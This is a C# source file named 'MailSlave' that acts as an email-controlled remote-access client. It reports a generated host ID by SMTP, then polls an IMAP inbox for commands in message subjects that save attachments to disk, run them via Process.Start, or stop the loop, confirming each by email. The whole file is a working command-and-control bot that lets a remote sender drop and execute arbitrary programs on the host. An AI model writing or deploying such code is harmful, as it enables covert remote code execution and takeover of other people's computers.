using System;

using MailKit.Net.Imap;
using MailKit.Net.Smtp;
using MailKit;
using MimeKit;
using MailKit.Search;

using System.IO;
using System.Diagnostics;
using System.Threading;

namespace MailSlave
{
	class Program
	{
		private static string IMAP_SERVER_ADDRESS = Properties.Resources.IMAP_SERVER_ADDRESS;
		private static int IMAP_PORT_NUMBER = int.Parse(Properties.Resources.IMAP_PORT_NUMBER);

		private static string SMTP_SERVER_ADDRESS = Properties.Resources.SMTP_SERVER_ADDRESS;
		private static int SMTP_PORT_NUMBER = int.Parse(Properties.Resources.SMTP_PORT_NUMBER);

		private static string LOGIN = Properties.Resources.LOGIN;
		private static string PASSWORD = Properties.Resources.PASSWORD;

		private static string FROM_NAME = Properties.Resources.FROM_NAME;
		private static string FROM_ADDRESS = Properties.Resources.FROM_ADDRESS;

		private static string TO_NAME = Properties.Resources.TO_NAME;
		private static string TO_ADDRESS = Properties.Resources.TO_ADDRESS;

		private static string HOST_ID = Properties.Settings.Default.hostID;

		private static bool whileShouldBeRunning = true;

		static void Main(string[] args)
		{
			//Properties.Settings.Default.firstStart = true;
			//Properties.Settings.Default.Save();

			if (Properties.Settings.Default.firstStart)
			{
				Properties.Settings.Default.firstStart = false;
				Properties.Settings.Default.hostID = Guid.NewGuid().ToString();
				Properties.Settings.Default.Save();

				HOST_ID = Properties.Settings.Default.hostID;

				sendMail($"Host started. Host ID: {HOST_ID}");
			}

			ImapClient client = new ImapClient();

			client.Connect(IMAP_SERVER_ADDRESS, IMAP_PORT_NUMBER, true);
			client.Authenticate(LOGIN, PASSWORD);

			client.Inbox.Open(FolderAccess.ReadWrite);

			while (whileShouldBeRunning)
			{
				foreach (var uid in client.Inbox.Search(SearchQuery.NotSeen))
				{
					var message = client.Inbox.GetMessage(uid);

					if (message.Subject.Contains(HOST_ID + '#'))
					{
						client.Inbox.AddFlags(uid, MessageFlags.Seen, true);

						string command = message.Subject.Split('#')[1];
						string appName = message.Subject.Split('#')[2];

						if (command.Equals("SAVE"))
						{
							foreach (var attachment in message.Attachments)
							{
								Stream stream = File.Create(appName);

								if (attachment is MessagePart)
								{
									MessagePart messagePart = (MessagePart)attachment;
									messagePart.Message.WriteTo(stream);
								}
								else
								{
									MimePart mimePart = (MimePart)attachment;
									mimePart.Content.DecodeTo(stream);
								}
							}
							sendMail($"Host ID: {HOST_ID}. The attachment {appName} was saved correctly.");
						}

						if (command.Equals("RUN"))
						{
							Process.Start(appName);

							sendMail($"Host ID: {HOST_ID}. The app {appName} has started.");
						}

						if (command.Equals("STOP"))
						{
							if (appName.Equals("SELF"))
							{
								whileShouldBeRunning = false;
							}
							sendMail($"Host ID: {HOST_ID}. The host has been stopped.");
						}
					}
				}
				Thread.Sleep(10000);
			}
			client.Disconnect(true);
		}


		private static void sendMail(string messsageValue)
		{
			SmtpClient smtpClient = new SmtpClient();

			smtpClient.Connect(SMTP_SERVER_ADDRESS, SMTP_PORT_NUMBER, true);
			smtpClient.Authenticate(LOGIN, PASSWORD);

			MimeMessage message = new MimeMessage();

			message.From.Add(new MailboxAddress(FROM_NAME, FROM_ADDRESS));
			message.To.Add(new MailboxAddress(TO_NAME, TO_ADDRESS));
			message.Subject = messsageValue;

			smtpClient.Send(message);

			smtpClient.Disconnect(true);
		}
	}

}
